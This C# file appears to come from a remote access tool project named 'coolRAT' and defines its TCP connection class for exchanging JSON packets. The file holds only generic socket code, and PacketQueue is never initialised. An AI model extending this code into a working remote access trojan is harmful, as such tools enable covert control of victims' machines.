using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Text;
using System.Net;
using System.IO;
using System.Threading;

namespace coolRAT.Libs.Connections
{
    public class TcpConnection
    {
        public int ConnectTimeout;
        public TcpClient Client;
        public List<Packet> PacketQueue;
        public static explicit operator TcpConnection(TcpClient c) => new TcpConnection(c);
        public TcpConnection(int connectTimeout = 10000)
        {
            ConnectTimeout = connectTimeout;
            Client = new TcpClient();
        }
        public TcpConnection(TcpClient client, int connectTimeout = 10000)
        {
            ConnectTimeout = connectTimeout;
            Client = client;
        }
       
        public bool Connect(string Host, int Port)
        {
            var result = Client.BeginConnect(Host, Port, null, null);
            var success = result.AsyncWaitHandle.WaitOne(ConnectTimeout);
            if (!success)
                return false;
            Client.EndConnect(result);
            return true;
        }
        public bool Connect(IPEndPoint EndPoint)
        {
            var result = Client.BeginConnect(EndPoint.Address.ToString(), EndPoint.Port, null, null);
            var success = result.AsyncWaitHandle.WaitOne(ConnectTimeout);
            if (!success)
                return false;
            Client.EndConnect(result);
            return true;
        }
        /// <summary>
        /// Sends a "Ready" message to the other side of the connection. (Indicates that this side of the connection is ready to receive data.)
        /// </summary>
        public void SendReadyMessage()
        {
            NetworkStream stream = Client.GetStream();
            byte[] bytes = Encoding.UTF8.GetBytes("\r\n\f\n\n");
            stream.Write(bytes, 0, bytes.Length);
        }
        /// <summary>
        /// Blocks synchronous operations and waits for the other side of the connection to send a "Ready" message
        /// </summary>
        public void WaitReadyMessage()
        {
            string received = "";
            NetworkStream stream = Client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            writer.NewLine = "\r\n";
            writer.AutoFlush = true;
            byte[] bytes = new byte[Client.SendBufferSize];
            int recv = 0;
            while (true)
            {
                recv = stream.Read(bytes, 0, Client.SendBufferSize);
                received += System.Text.Encoding.UTF8.GetString(bytes, 0, recv);

                if (received == "\r\n\f\n\n")
                    break;
            }
        }
        public void QueueSendPacket(Packet packet)
        {
            PacketQueue.Add(packet);
        }
        public string ReceivePacket()
        {
            string json = ReadRaw();
            Packet packet = Packet.Deserialize(json);
            Console.WriteLine($"Received packet of type {packet.Type}");
            return json;
        }
        public void SendPacket(Packet packet)
        {
            WriteRaw(packet.Serialize());
            Console.WriteLine($"Sent packet of type {packet.Type}");
        }
        public void WriteRaw(string Data)
        {
            NetworkStream stream = Client.GetStream();
            byte[] bytes = Encoding.UTF8.GetBytes(Data + "\n\n");
            stream.Write(bytes, 0, bytes.Length);
        }
        public string ReadRaw()
        {
            string received = "";
            NetworkStream stream = Client.GetStream();
            StreamReader reader = new StreamReader(stream);
            StreamWriter writer = new StreamWriter(stream);
            writer.NewLine = "\r\n";
            writer.AutoFlush = true;
            byte[] bytes = new byte[Client.SendBufferSize];
            int recv = 0;
            while (true)
            {
                recv = stream.Read(bytes, 0, Client.SendBufferSize);
                received += System.Text.Encoding.UTF8.GetString(bytes, 0, recv);

                if (received.EndsWith("\n\n"))
                {
                    received = received.TrimEnd("\n\n".ToCharArray());
                    break;
                }
            }
            return received;
        }
    }
}
